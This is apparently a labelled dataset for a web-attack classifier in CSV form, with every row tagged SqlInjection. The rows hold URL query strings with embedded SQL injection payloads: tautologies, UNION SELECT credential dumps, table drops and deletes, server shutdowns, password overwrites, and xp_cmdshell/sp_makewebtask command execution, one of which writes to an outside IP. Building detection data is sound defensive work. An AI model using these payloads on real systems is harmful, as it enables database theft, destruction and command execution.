id,class,vector
17205,SqlInjection,/ehwhnuWma.aspx?ieeedeainurrAd=o6G&7eo=Rfrt2EhD6rdigrd4ia&wsrr0nab9q=ddageg3bor2ENty&espd=wVXWUqnLd&rfel3a3tduh=OR+++%27fTs%27++++%3D+++%27+++%27&aaUtuKEaSiAti=950&dhtt=mytooAmTt6ts7hw&Agrna2t=3805
17222,SqlInjection,/exes1hndssd.shtml?nnAiyEo=linkS&dnth=18&2eeiqiA=danhvhoada&zarpsrrnrbbst2g=ie0dcC&whereYOnodeleted2Z=073&wQVPhhavinghomeG=dn2n1Bpx&xmeesin4e7ft1na=oN_sJTvFMKSx&it=74199&F9n-LAconnectOm=sriMe6&e8ae=exec+xp_cmdshell++++%27%22geBaogobe%22+++++%3E%3E++script.vbs%27
17223,SqlInjection,/eEhzB88j3.Ls5/GhiNieebe6rn1/uNe8-UnZOBxD/df0j4lm/fotjtaeanwihtgratl/7gnshe6/haeiy/3suhtfoaeNrluO/d-80m4NXVkziD/e_YH9myOdERYF/muRyRctEiiRtHdGPI.jsp?X3SwDX=%3Dora&eeio0eenr=5&I5f_YV8j=19852148&rucsmitttEe=g+s%3F%3C&9fcao=sEc%40d&rh3sehaw8ny4=825280&alVPCn=re&6qtahbu=10152&JnhDv5oe=%27+++%29%3B++++delete+++++from++users%3B++commit%3B++++dummy%28+%27&OFDdtelnet=sfemAyveE9xoohaoay&sghtio9te4erhs=64498782&1wcohb5u=Jratzn&et=doswikd+tyoh%3Esseih&erreysrtsedc=%3Eye&n53j=4763
17247,SqlInjection,/gwyXC3EC/sbM@WW10qlOTzVe/hqXjREUnK@U9/Hnho16th95rsrtgx/rl/elrdwiIhvn/iAkFcics/ol5R..jpeg?mR1vus=%27%3BEXEC+master.dbo.xp_cmdshell++%27cmd.exe&rueiairtoa3=tcmdinosp-nySwstg&ietArpxtm=903027&uQ0wKYsfmos1=8144&ay9mnEop9reh=2j&m0=705530&saos=989895&reoUsasioPris=nYea%7Ea%283w7rpositiondw&rnnistaehbua=4Vhv79F
17288,SqlInjection,/sn1ThtnCtf8soeAn/A3EunionQ8XAP2p3h/7R/slAripgteslHo/smtnyAlai4ue.msf?XcmD3idecAa6ti=ttmp+r&mio9w=l%3C+ut&0aUxP4ao8xj.=fdxrur7kl2nrdnEdt&co5eet0sItvxa=%27%3B++++EXEC++master.dbo.sp_makewebtask++++%27c%3A%5Cinetpub%5Cwwwroot%5Csi.htm%27%2C+%27SELECT+++osqrE++++FROM+++++oaaueuf++++WHERE++++xtype%3D%27%27U%27%27%27&kcqtk20eAdOsiq=6&etuOfwwo=oRVb0&Rweasn1ehu=ew7tthu2&aa=sS44u&wllocTnbctoe=fehaeocIets&TRhotgnnokaje4=1&7wyptrgge=iermsm%3Bsesn%29+intu+ii&nBoyera=pcorUEvdtU
17293,SqlInjection,99a7Ieiit=4ge&oit=snsm>F2cmul&Ientlt5e1oD7=rd&M2W2Khmocha=epmcatoinEednn&izwrlear=70&pCiELZFc=4_fl4uJBdL&QRfalmu=QGsf8&leeeo5bs=48209909&phcinsLidoe=45525433
17294,SqlInjection,/1z3/orNaabuehhroewcd6/odQw38BvFbT.EhOZ/eSonrarjNkfeweu/u@i8kVyUdRFiHjSH/LyAbu/sS3F@/hadeseKEjs/t-cKCfqyDiWswj0zuC@A/taoghAsdhea6j8e/pgroup
17306,SqlInjection,/7oeiuisphtlk/ictobtrOl6/ode/llImQIEOZk0mcVOzw/2stdsntfslibrmrpgD/eKtY8.yzp.kREn_fr/gBXQ5.swf?aeTed5udwsee=oc86&eitybnihn=Pnwat3t4dhl2hs&eAaEsuEyHF=9&eaenentgpIfyzo=812262&Aserltuav=%27+++%29+UNION+ALL++++SELECT++163+FROM+++Ngrez++WHERE+%28++%27%27++++%3D++%27&wn=nRvhhsbihLtD&rrnhtyuihmyfm7b=%3Cike+9rbmt
17307,SqlInjection,/ytrtPtcl/pgiandaREtelnetUsQIs/s7rrwIerhl1muDpbo7lp/cBq8WZxTtxCvtSrK@/iZanSk1Sch_o/2o/DkGrl.png?ucReanoi81s0b=arew0w9amtpm&yk0fmgmpvnl=dE+a&ierwco8=nmC9hkY-&kd=%27+++or+++id+++++in++%28++select+*++++from+++++++user_db++++%29&i9rhnlatoyaE=s88neubna7QmaahAwl&61lii=25&inne=32329325&eelttoenjitsu=msuhsyoe&ew2johj=57011
17314,SqlInjection,rfzsatnonVjaot=921&to=Fqig&eicTno8ele=208019&xpd7BinCJI=cA-yK@7TVVfe&EeuadmVcnpftc=516217&eoom0=7&oirsgtoalese1= trwhere&otsx=he6e?&s@NAix.=ofeal&3ceeewr5pmt=72776&iaeTt4v=flgozvlo&drDaAnO=73249192&EQ4dHO@WXJm=eS?can hocftp
17336,SqlInjection,/hdaLhzj_MipsWas/8Dhtaccesogy3J5dM/drcecyfss/0L_U/pzcmHubre/r-U5/h1.J2Gnw-kkieq1rI-.0/e4r.htm?ti=106527826&lt=bulk+insert++++Dyas+from+++%27pwdump.exe%27+++++with++%28codepage%3D%27RAW%27++%29&leeetzlso=830&bA68Kb=wnXeoba&tyec=yHtsyVd72&in=hepasswdtSwnkxjrsg&aceuizetsnapvd=ERlt&otVea=eqcJa%40Ha&obGkyaaestdCag=icmeuxOredxto&QxtermOsWT3=135281&geh=76397
17344,SqlInjection,wlaeaaonlanohx=8722&Hd=EwmsEd=no[la&_itMR-Mmhw=tlo8ohOZfawnou&wysinleeactrmE=6&de3Steamh2=qwer'    or  ng0h6e_v.Account='nwisragl@rdpbre.com&ou9sndOeieha=04bw8epC
17348,SqlInjection,/hQrS5frsnTna8eeri/hGRVi41DZbdAMFqFG/1nsamc27eV4andnHK-T/ibyElx0eodrgeieaumsr/IcopyiSYDVbTER.G/tIcYpUzw2e.tiff?qee6srate=s.qsz7q.d&eertta4jTeeh=a3rmmG&atmaee1tul=sD_F&et=qloeedaedunUao
17357,SqlInjection,fHn-xi='   OR     'ldltsses'   <   'X&vcecni=euegsitt3ii&46c0idkehe0emt=5141466280&lrLlh=376&wgrt2yia=e6nW7Gb&8Bed=75&l1tfhhrop=oahciande
17375,SqlInjection,/MkloTD/whefqeoedlseadHnstUs/mleaecoQemtasiehn/-jIXAIdZZl_PD/aetePBtt/aB6dYqIBVtbPNEU7HE9q.htm?oez=27753&eeohiuesjfs7gc3=ie-J.D&oraevrii3pie=do-ht7-+re%2Fx&agr64A8eeo=6&-L_betweenX75=dn+loea&hP2wutth=hiirt%3F%2Fe+smc6a&9perlu-F2=nbstdintneOh53&RLMFiC5wT=Xdb&7eaifrwrra=%3Balter+table++++teinnt+++++set++++password++%3D++++%27aner%27+++++where++name+++++%3D+%273m2tonon%27%3B
17407,SqlInjection,/lhv6yDcDim.php4?kiteonEseI=%5Cstwawt%2Fea%3Flnhrm%3Aobi6&eaCneyso=+%40yrcsdOn6&ZWX5Z=5dd5dazPhw&nao=70661&vaoseaabnzD=7187511&htseaualp=dRtgnreufa
17432,SqlInjection,Hxnode6-bzYStelnetq=neoLnfm&5_QKhM1_fG=';    begin declare    @ret   varchar(8000)  set @ret=':'   select  @ret=@ret+'    '+sjomR+'/'+password     from     rtteim     where    nz2sp>@ret     select    @ret   as    ret     into foo    end--&siaiteponua8ce=lhaesedsOeaU4r] &i4ss=oKAm9e&3uybottryys=rn&Sees=e-A2Zy&yuebavtlE=@[&Veshla4@l7W1=676
17436,SqlInjection,cSVT4PzHe76=eEkDQ9T7A&jd2zonll9nmscwm=olsrk2eIif&ptbtnc52s=13&copyZqcK3=RsakooHe9nsn8e1s&9nN6wLg0m=720201&emt='  UNION        ALL           SELECT oy    FROM   ane26s4 WHERE   ''  =    '&azurb=62&aqFtept=2057081&Ygazkz7ojtlno=38ouycnddsl&PpEJ1D0P=tMBTH7VxJM&ouaiZoiuoco=Iheqronapusojdzoeu
17437,SqlInjection,ltlnEd7ptve=napsjn9 &qtb=39045&xs=5>xp_Dilink6serm&taou0e9=oo rbh=bhaoeroa5cr]&bizahcoteieo=0490894&elnnudem=So@fik$]tbsoo$r&nkmdhQlaFw8N=4ff8dusra|lraod%7netcat&3Do=u gsbstyle&lee1=uTwi5L&mtn2v=form5 ge\group bya0geoqe]0&3adxLo3edemit=itPseacaEeiiG1sr
17453,SqlInjection,/topfri8serin.jpeg?evhsimditha=Tsqhilhd8Bbs&aV1=m0ttuu3xirklxfeo&nrweclcmeulk=hK1gqN-i8w&rts=90437&io8h=%27++OR++++%27odoiu3o4tt%27+++++BETWEEN++%27R%27++AND+++%27T
17468,SqlInjection,/k6YV2iGAN@gcL6iO3/dtmfGSsettyeleOaSl/sduooeiyo68tcsxcs/9.2kQ@M945fIdn3GsX-/pAahwihnr/z@dPL/hx_tqes2tGNpZ/ndiar.html?ns4eot3edtnxnee=EltEpatn&ceqashero=7657134&jtF=aeiygloais&encC1Z6=i84AmorisT&ldThsHlmel=gsirtg&eoene=OrigText%27OR%27idnSnt%27++++%3D++%27jMi%27&1enyqoilo=arlEeetsl&9ll=document0tdoqGEicet6&rssae=131&qenoutmwace0x=66497735&ds3iugssod1a0ii=7ba&oktvhaeil=%7C&xZPo=%2Bcatnlsei%40susw+xp_&hYT7TXB=npuRn0emp
17470,SqlInjection,/irc/nhBdtxa/ZVf/sEvy.mspx?oovrlhwtoN=89507&5eonn7g=hB_OXBt-E&gheqwyt=i.DT_laoHuZ&3yer=g4&bovzmerA=%2Fdf%7EpassthrunodelFincludessxn&uueitzzwv=E5nef&oatuu=2%24&Rhrbwservices8=%27+%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F34877%2F**%2FFROM%2F**%2Fanisdetls%2F**%2FWHERE%2F**%2F%28%27%27+++%3D%27++++%2F**%2F&Wienalsiprah=amwid&wheretHK0ikchildNz=17093806&welue0=liSnTm2
17494,SqlInjection,/ywhereD.etc0passthrukXK2Q15w/tlkwqmwalDhegg/ri/z5twlEJOb0/3n1vX0raGn15/FAljliEiatasN/o2cNvmU-45eH/neynoSnswhfsi.pl?ifnmnhjahof=119664&Nlt9cpf=nzw--rmf2.h&ed7o=e+si&fnnlttta=cupdatet&2koapQ=860153&rrt=3237356&7tpE5OCADe4=iTuueoykieedrx2ew&ipaeaoa=and3&tl4hn1=dtr&fps9otni=e4fytiNconnectddecatt&3npuedritpt=%27++++OR+++%27%27++%3D%27&adTtacnsL=82068&pao3Hh3grpexIh=xEW&nAm3odr=fpnndlnssE2edhnm
17552,SqlInjection,/Wk8.pl?jTEo=9057604&euroahtunhttSr=eibatg3&n7cil=woetf5xqsTaeeeuN&1h=226015&ie=imorh+ty&ulhrs=chairs%27+++UNION+++SELECT++++lcnAtxat+FROM++++dba_users+++++WHERE++name+like+++++%27%2525&fn=Qudlnae3ui
17573,SqlInjection,o1tdeetUhhtc=eH-&aY8rAolihn=72546187&heLNOsoteR=7999124&LlEiccot=1&nc=26082050&tbhIseou9dtaloo=tj_dHXL1pJC&2lieym4at=819&soaon=glar&hmjigcTtD=iegleebYtai~w~bte d&tEmeaeionT=rtI&PVWAJYB=4betinnk/S&RQEfKdZA0LjI=OR  475756762755=475756762755&n4Imhx6eie=dSNsRaD4CF
17580,SqlInjection,/sbLzd0hehmrLhhmti/hkNyHVrZNuBevF/i05/httpsfA_KtUixS/mdeeonewarln2ua7d/g5@oc/dXwGEqz11K.shtml?ysVtn=ao1halhitn&and=oeiNbtwinnts+ezsam+h&2sz=chairs%27++UNION+SELECT++++ckrsps+++FROM++dba_users++++WHERE++++name+++++like+%27%2525&xhaNsieait4it7o=87&e4s=fSa&nt=2Dt&oeotuXdkUbtIdr=59324747&ddk=%5BanlOyee&firoeHejnarn=fwh%273d+%5CrnmaC&L.VZ5DDopen=tdJ&wdVFpassthrusoZI=s1replace
17634,SqlInjection,/z_UlA9Jaso/i3ShbsFUL/edfP/r6emNnig6ihc/lhlheuw1maroLtoeNr.jsp?zJwvK9@2QCA=04935496&e8feXewer0=n9MX8JI&php4.yuminsertsWTc=i87hnr&as=9%3Ao&na4Eeuioe=qbbgsound2ecsivaE+Ao%3D%3Cttdb&aakOrAudiccc=2473010025&ix=ms8L0P&innEuaenwyqais=mCXjhbik&eowaczp7e6=gtr&IiLe3oihTiiic=90&u24=byb&qOH.iMs=ecgPI-&ism9eekHtRhsSnw=l9nf7_RP&sianfroHsO=xf+&Ehcns=S51lir9creetRn
17641,SqlInjection,@-divnph-N@NtmpVH=714786&tsi=link5l;6&hprocessing-instructionfromin [t5child&ehsotVn3sS=lnpe1snhqqvborh&nn2ofmnkea=TznieuiegilnetEkl&ael=lr-K2UVvCO.&eingwulubrfaoz0=8diOonmrrulg&hwjmetHwmp9e=A-rcp\&k@jq=689
17646,SqlInjection,/rmQd17_HBaDCp.htm?paunhuihnhia=seAjHkF&eaotaee7rt=971&eatee=7ptahlosa&uoietnerWnurace=le&2est=or+0%3C%3E%28select+count%28*%29++++from++fmm%29&rSrdmrre=sc14uuh-BK&sm=0922450&usAt0wu8eGirqvl=876539&RGczCxgfeowy=no2-rE%26i+%7EqrNenph-window.openui%3Bservices
17647,SqlInjection,/at7DTy64v/czQS./l58Fk_/7L1iA6prnsrdvag/ezZel5FrXrUCkLe/te5hagimrpoodyaEh/er/ck/WJI.nsf?shqive=%3Cuil+ldei9gR&Iee86dt=bdimg&wu7nosia=%27+%29+++UNION+ALL++SELECT++++1+FROM+Hmtloh0++WHERE+%28+++%27%27+%3D++%27
17648,SqlInjection,/o8heZh_Vq0SMQjAyvu7/.jWI/aitmcu.mspx?s1mV_=%27%3B+shutdown--&niiee=eMehoa8s0binur4TeNnok&J8-EUxtermF=+sCb%3C
17655,SqlInjection,cPsam5=Nz8&ilar=a;fom%u&tm=02018&0aidKnph-=ien&abhtr=6198&R4a8wrcA84hi=mbltYuc&Nasor1in= eg &fbat=d5olB5cWhe8tstylerls&ortzlrdebthc=from&eital=eupdatemr
17658,SqlInjection,/mzwLnJ2fASlG-d/aRi0WMzOZ1aH-7yO/g5ZAEPZ8C/ejGwQ/sigTt/t0/kQgvpKH1on/qeafat8alusetmji/ieowu9wdtbiyop/ret.css?asOlxyttda=2635265&C-t3l72e0=%27+++++group++by+++users.id++having+619%3D619&AioOeoee=cwe&ntaaije=ro%7Crajpsi&q1ktlihsotc=ybelim7ilot1fnshne&hcdAe5n0et9=efShiso
17690,SqlInjection,/wnIejresg/uOLzaw/logYT2idcK/dWi0bjO7MH7qpQ/7byRURjSthBpG8UWA/f17fZ3S@Y8ii3wI/t6ngDDFPFwOvml0o6_F/srst/bsyQwtAsrpmoq/UuUP/fareiM.php?rSp1nht0SNhlmE=OR+++++%27aoo%27++BETWEEN+++++%27R%27+AND++%27T%27&.YkYosFERDeD=dRtmpdo&wp-Bu2VyhttpsVidv=nrNl9ui&Eineufo=9281439&wd6trPifIue=nbyhu1&owhotdjoW2w=6net&rmsAeyf4sk=baU80d%400Z&cl6irZsWd5mb=hlMh07woZni5e5&ueolx=re0lbsojRx&2nnptearvshf=tot5zxVP
17707,SqlInjection,/tQD/hH9T6j7Bsock_streamAv3Jka/pr/wieslrEdn4ee/oqnhteho/PELRrchildpassthruutSMPobjectZ/ta2-eBhuY4lRHMJ.jpeg?9rotHttmx=%27select++customer_phone++%27%7C%7C%27from+++++customers+%27%7C%7C%27where+++customer_surname%3D%27%27%27%7C%7C++++lv_surname%7C%7C%27%27%27+and+++++customer_type%3D1%27%3B&oytNdrl0li1=hoof3s
17735,SqlInjection,/Oarhsd/eCGE/xK/5EW_m3ESpUgtYU/rmmiasl9Wrifx/dec5wqaj/aBG2-cSOEKn2XmV/enksiX3nlhn8yrl/DRxbuselectbi6xq.msf?dk=7007271&t5emruoi=514366&st8sot8tntai=tineeee&aaatl3xwtsdm=ohs&6ReItG1wboeh6=90&6rREcbtojEsser=i5-gs&iOeottiDIhdgt=368024&wr=%27+union+++select++%40%40version%2C1%2C1%2C1--&opoTph=iiee&3heaowe4vnaoo=nmutp&mts5h=coE%3Ft
17749,SqlInjection,tnrihetdji=cowIalc+zp&ptiPnx=r0w&lrtGt5dOe=5&sai=7&ldcheIt=se&g&YVyhKYL=eSTboi&fspladnpr=wyEqMqVR.wcz&Erasng4ndneRoo=vArfaae&msssasrlAfert=hp5KQas50lbg&5u9AZlu6t=hkobteo7&fcwlcmsu=2325324912&at=8210169&macttuqioendp=iAK
17770,SqlInjection,/ZigavtonxLbnRS/PL0Dhj/es6bln/RTgrtaeponoti/nggSfmtheNtuhAscns4n/79q.shtml?etm3iithst6s=atjxesd3aDetltbl9&Qjn98tte1owAe=%3Fst&vZo3y9@=u1BqIxA&tteiaewine=+++OR++++2+++%3E++++1&wZ=644&wEO5S=s&exdk0=r&sserlidma=583611&Bwo1=eaS+8&CnCxterm=630911&tbotn8ht=ofAd1T&atasia6rsk6ih=171944&stfglyeseeu=esstdin&CeiticnEeira=2&LApemieAazltsW=ewtpge0tzbdu
17798,SqlInjection,/8MkrQIb4/xnph-nDIvAR1dh4A/mPmgsamaso/bXaT/a9ijDA4L5RlheGiVQur/deaferutnmfnroteo2E/ohdta/sFUO70QdW6Bcqx_/0nMt8arfIBebislo/petaE1ttfapntheo/nLtCqHLw4L.dll?htaccesRi5X2ENyautoexecA=0wf-IAo2e&odshgytwfnnmni=ern2p&itx=eoidh%27%25oe&nm=8exec&snlhnenriezmejr=onlVldslH&i6fgo=or+0%3C%3E%28select+++count%28*%29+from++iiflSmvB%29
17854,SqlInjection,/_R4/u0P/sHwxQUxihpmbtVl/qWf_jEryazrG.gif?awcley=6besslea&dqsn=oe%40&rsdaso2r1=%27%3B+++++EXEC+++++master..sp_makewebtask++%22%5C%5C251.100.86.183%5Ch9naeS%5Cjde.png%22%2C+++%22SELECT+++++*++FROM++++INFORMATION_SCHEMA.TABLES%22&Ngawnslweahx4=76236&ii7obt=tb8muoaleee&8Bn5tP3scriptjEyr=tfhe&oefooma=deletetihc%7Cmttfa%27dttmailexiD&Nejuvm=hn7ao&oInfa=1143085
17861,SqlInjection,/ttvrgQgIw-eYoEGk8b/isieepn3Me.jpeg?JA83C4JNL1=%2Bse&aU_Wwo7JHVn=zd%2F&eterzraynifhr=%3B+++++EXEC%28++%27INS%27%2B%27ERT+++INTO++users++++values%281731%2C%27i11ssutnlU%27%2C%27pme6%27++++%29%29&utolemr=206&9rarh=512&8mivm7t=d%3FE%3Bosy0n5stdin&isR0=lueae&OJdocumenta57KY.mC9=5785792555
17891,SqlInjection,Emtihsn=h19gMVtPfTNO&geauctjAsozsOi=';  begin    declare @ret  varchar(8000)    set   @ret=':'    select    @ret=@ret+'  '+2br+'/'+password    from tLudnt where  Xhsi>@ret     select     @ret  as   ret    into  foo end--
17911,SqlInjection,/ilobeofmxater/.9aEQUv0PMX/dropJdropix9H-t6Lz/K3NbrcpU8QPDJvXyw/dRsXZokeFY/e6w/t46lzQII1ioGjgT/oQVWS1/SAr/ile.sh?phat=%27+union+++select+++sum%28ds%29+++from++agasq--&bbimIc4obeh2=dioupdateoufma&tueE=z++inaioittt6&e9Ei=796343356&yuy=3356547&t2omnHaid=omceratac6
17948,SqlInjection,/fTSf-/sul/deow7/7./XThttpsC@WlinkMMN/iteurmyqe/lBz5ORlg4BgQ60K/ndtsaT.cfm?7bLteIsykfzewot=snv%7Cott%7Ed%25i8&eae7tm=9795005&alIWjnwindow.openQ=uffrahcmntfeu3hseo&eInhhtebcipo=hlr&Nedc9iayh=mwlorobject3koi%28enh+%40&XtDvK=shtad&owinOfoHlclb9hm=asdnHmha&sbihnadndhrI7=%27union++select+PASSWORD++from++DBA_PASSWORD%3B--&w@lDBNBaHLO=s4Viqr2&fMantIr=5llddIeYwo&jE6utpaYenet=7615&uom=%3C%2F%26i%3AD%3Ba%28eOdra
17979,SqlInjection,V2MN-_z=ids&qBFjadivR_m@=4177&8s=p6wh&orloo=6&gn='   group    by    users.id    having     4448=4448
17988,SqlInjection,gpeznhw5j5=]nhu&window.openH3QZkF=Gv&5X3WZEvdx2=6
18002,SqlInjection,/hmpwneoioiilhaorrf.gif?ednasi=7677565&dropY0dVPpasswdPh=acweW2ztthsehtMoh8&pesIerelte2eNL=ooc8nmtctrhnnaocu&YoqzDb=8uMo%40U6.1t&aqnkrft4inrrHd=%27select+++customer_phone++++%27%7C%7C%27from+customers+%27%7C%7C%27where++++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and+++customer_type%3D1%27%3B&gnsig2=9econnect%25uqnk%2BrnN4&glogUhAeQ5passthru=18653&eersktafdtcarig=%28tgNvar&zodb6Teyz6=04701&tH9dnsdn=%29hs&tmseeraTrgh=058076862&c21hercu0=5s5e6oyItiHna7soso
18079,SqlInjection,/peeat450e2T0/@UVokj/Bx@xSw5X335d9/r.K1knRvb/lsclt9anndr1qE/mMUh0/thkxCk/ort/eE0FTA3ciJewuVr/zqnpieidOhEnrcc5cO.tiff?yeaepcarn6noc=hk%5Cn&NfoorrmR4j=7xBcJbkXNUA&hatleCgin=7s&cIrebdvk1zugP=%7Cdocumenteco&relesbccFeg3r=di7hphtEmi1Tr%3Baf1vt&gsmeOh=%3B+EXEC%28+%27UNI%27%2B%27ON%27%2B%27+++++%27%2B%27SEL%27%2B%27ECT+++++%27ols5Li%27%2C98870%2C073%2C%27eorbw%27%2C9+FROM++te%29&TiQa89Tall9=hfZxSRqelktAe&19qwget5lM1_8gand=nhvs%7E&phTdr3Sia=+ns5&iKiafseshe=400430298&8i6mmYr=nph-d&lteiteevw5aw=825Rr%26%40shttwTyi&spiutmgjtmnrahr=opH%40
18080,SqlInjection,euP75=gewgetolo5Gu5ltde&ulcadxfd=mMte\aniihp&t9gghiXk='    OR   'raaoa6gnee7' BETWEEN   'R'    AND     'T&S9qOaoso1a=184&sFemmq=5&ndlsshFodi9na=i8ty&givtenyEh=edeobaOcoea&sad=dIn6iop&CPK6=39
18092,SqlInjection,/ePP9PT_C@1r/r9hhckxKk6r4Ev7/NTQRprocessing-instructionl1J_copy3/nh5t/ml/j@AQVXddzsHaKSlGh/t04zu_-4VBB-iHFr9As/mdwgetD0QTcA/ecykn7ytig1.aspx?iR=2132718052&pi4etaei=t.303s43&eotnrnt=ri7U9eyAsiSnhiuzwB&flarsiDfltt=e8luve&0Oyinske=739902&frominputHJSYJV4x=19077&5ooTnW=aeB%5Chshe%7EdfiV-eiu&lhecelttmaico=%27%3B+shutdown--&ykcsee3aPaAdi=pTpqX&Gvjs=eZe536FZp-
18126,SqlInjection,to32ger=908&ToEimmarem6te='UNIONALLSELECTfieldFROMmalemaenneWHERE''    ='&otaeTdn=esdKheolo&finputhe80QVQ=zdaesawt9elte
18140,SqlInjection,oAgodr=';     drop    table    admin&asA8gllerHs=26647677&7asl=bap(cfo/he&pypvhsxatre=bnZnGUtu&replaceQUtelnetIvkand=7616717&nuugde9nseif0l=lZ1gTu8C&WVwr5XI2xhomev=<xmlfaNag(tn tni&tHhssvti0ee=270227&itaqh=hti&dntrpw=9nn&ttbffaed2inRlf=~:a&ltbaxryis1mn=ta&NsaiW=ol&ft8edts=S0io&wa9w=sfdn
18146,SqlInjection,/lebHD9rUXdIREUuSUY81/4FHIg/trtnlleSwa/oradhreeiuju.js?oh3ridhhden=23&dge8zteyeteo=saied&eoohnau9abthx=xpg&siw6732=150676&0d4dsap=8611&ed=w8tqOwjaf&asaiuuTdepl=419493765&munpeHenrxs=%3B++++exec+++get_cust%28+%27x%27%27+++++union+select+++++object_name%2Cobject_type%2C%27%27x%27%27+++from++user_objects++where+++++%27%27sntuyuoeo%27%27++++%3D++%27%27++%27++%29%3B&ofAmbeUrwrErtid=maetmpd9%3BS&hMie=Ty749tlab-sxp_&tNltvIhhgt1srs=7563&isrmw=i4n&i8faitievaoeehu=921&ahiwy=cmsIW
18148,SqlInjection,fLr47cs=>ftpts;9ae&IoS@=2267575&uscesdgm7s= psjaq&reqetsr2tson=y3hw&4FzeAn=molsvclMtrfdeiK&5lewSoui9Flnn=hdfhHhmgkvaTqoiisr&tx6bl=0781
18192,SqlInjection,/ineiyeld/m0/oCDMGd6V9vs/bRbwy/sEfc0ld0PWZsJAV0.jpeg?oS6qba664i=exec+++xp_cmdshell+%27%2288lln1e%22++%3E%3E++++script.vbs%27&cx6arlhrae=85767810&dosnmrhaoXem=srk&atidfuv0aPLN=laoDR.MeZ8&a4r=copyt&suin3etogmJ2pny=39098611&O7Taccept=rTryagdcxdgs&7fD.QX-=68200630&cejmser=709728502&mirvtati=ntteeubodyh
18230,SqlInjection,/efDcj/eA0ygVI/2nolc/DJW7Evo/sisacowh/i0k6/tNsyttik/iaubxoe6seuii/en2dtdn/9Niftoocamd2dharh/rVotoxrenmM0yraMz/ondddhswie.png?7bsEcsdi=pa&aepruh=oihzot%27-5+tdrljt6%3E&IQWalsdmochaV=e+ol0&AVf4=lqs&eImeecgLsiteahv=tVUL&cl=hX.3I&wlfiaen=036970&ous=01hzgh&oGep9=%27select+++++customer_phone++%27%7C%7C%27from+customers+++++%27%7C%7C%27where+++customer_surname%3D%27%27%27%7C%7C+++++lv_surname%7C%7C%27%27%27++++and++customer_type%3D1%27%3B
18237,SqlInjection,/sjo8@QLZS8A.ok/aVFVoTrEeIwypla/rbcxcsn6q/passthruCtyWperl7tjVYO.jpg?laz2sTaenn3he=mmz%7Cnbxstdintc%2B&biT=mfAr4&agErpyno=%27++++%29+++UNION++ALL++SELECT+++%27on7oeth0%27%2C9%2C996%2C%27l7j%27%2C845+++++FROM++ntt++WHERE++++%28+%27%27+%3D++%27&soola=ur&estsiiruiojti=rsait%24dexnahnlwhere9
18252,SqlInjection,/sqshapaatw7meansisp/nMhl2eez18eac7afh/tm_2xw2ySFEpUG/tL1XZd4/y3lo.dmQxconnectG/s7@/cWIHxatuVWCb5hZgXoBy.cgi?wpacUokcixP=693637&9VVBSw5Oinput=copen&mSzDipenwtlahht=mqe2e4&nl7e=chairs%27+++++UN%2F**%2FION++++SEL%2F**%2FECT++++Nhawhnp++++FROM+dba_users++++WHERE+tHlnfngu+++like++++%27%2525&aa2oqympeevnp1=7677759&utsei=4876&g3hGE=eFHFkvPMo-&mawp-B=92589079&pQVB=196282238
18368,SqlInjection,EZuadminD=169505&oenrf=$r&ep=45&Q8rPkAja=91&ddt6=pdnc
18392,SqlInjection,/nCw1/aWrjpLLEwN/CgkkuMGshutdown/bouh9hepqemc1neBn/efavrlf3eln5e3huH/a5K8zGxBVW/e2YNlPMzbih4beRik2/tkbuoitIdtt.php?hfeur=Zxp_e80&9qsf=jDg2CPlZ7CVP&olm=vesy+t5ndq&1IhWrELsGJ3G=en7hueaaAausokc&isel=rtsew%3Dnetcate3&gleh4=mphkZezrrmmS9
18408,SqlInjection,/e66rsbQa2Tjk/m@m_rE7jM28null/hnbTrKrp/e6ntsuEe5/.eSzP1PLX/oApfrseocs/seoe.pl?tsAoai6ezr=%3Balter+table+++++larolate++++set++++password++++%3D+%27ed%27+where++name+++%3D+%27citewmsn%27%3B&QHhzbEM=aa&oawseekneiajT=06947&8u8eb=colI%3Ctxilom+ah&eb=aeve9eit&ltcesnvot=rldtzl&lxidtlst5Nt=Bo
18410,SqlInjection,/a_R1X/79a/0yi6esof/ewrbacihiiye1Ssepsp/yjSeb/Q-UZ/fja0fdipsjtyesc0Hetx/kEVcZ.3i4.nsf?Udahnfmeos=sggbge&5R@httpsXT4O=iar&PInjmoymludnlia=or+++++0%3C%3E%28select++++count%28*%29++from+od8tlpe%29
